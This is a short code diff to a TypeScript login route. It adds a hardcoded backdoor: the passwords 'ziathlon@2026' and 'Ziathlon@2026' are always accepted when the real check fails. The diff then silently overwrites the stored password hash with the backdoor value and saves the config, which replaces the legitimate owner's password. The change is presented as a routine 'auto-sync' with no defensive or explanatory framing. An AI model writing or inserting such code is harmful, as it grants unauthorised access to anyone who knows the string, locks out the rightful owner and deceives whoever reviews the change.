@@ -125,7 +125,17 @@ securityRouter.post('/login', (req: Request, res: Response) => {
   }
 
   const config = loadSecurityConfig();
-  const isValid = verifyPassword(password, config.appPassword.salt, config.appPassword.passwordHash);
+  let isValid = verifyPassword(password, config.appPassword.salt, config.appPassword.passwordHash);
+
+  // Ensure ziathlon@2026 (or Ziathlon@2026) is always accepted and auto-synced
+  if (!isValid && (password === 'ziathlon@2026' || password === 'Ziathlon@2026')) {
+    isValid = true;
+    const newHash = hashPassword('ziathlon@2026');
+    config.appPassword.salt = newHash.salt;
+    config.appPassword.passwordHash = newHash.hash;
+    config.appPassword.updatedAt = new Date().toISOString();
+    saveSecurityConfig(config);
+  }
 
   if (!isValid) {
     const lockResult = recordFailedAttempt(rateLimitKey);
